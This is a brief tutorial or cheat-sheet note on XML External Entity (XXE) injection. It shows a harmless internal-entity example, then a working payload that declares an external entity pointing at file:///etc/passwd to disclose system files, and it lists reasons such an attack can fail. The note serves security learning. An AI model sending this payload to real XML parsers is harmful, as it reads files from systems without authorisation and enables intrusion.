🧩 XXE – XML External Entity Injection
🔹 Basic Entity Example
<!DOCTYPE replace [
<!ENTITY name "feast">
]>
<userInfo>
 <firstName>falcon</firstName>
 <lastName>&name;</lastName>
</userInfo>

📂 File Disclosure via XXE
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY read SYSTEM "file:///etc/passwd">
]>
<root>&read;</root>


📌 Reads system files if XXE is enabled

⚠️ Why XXE Sometimes Fails?

File permissions

XML parser restrictions

Secure configuration

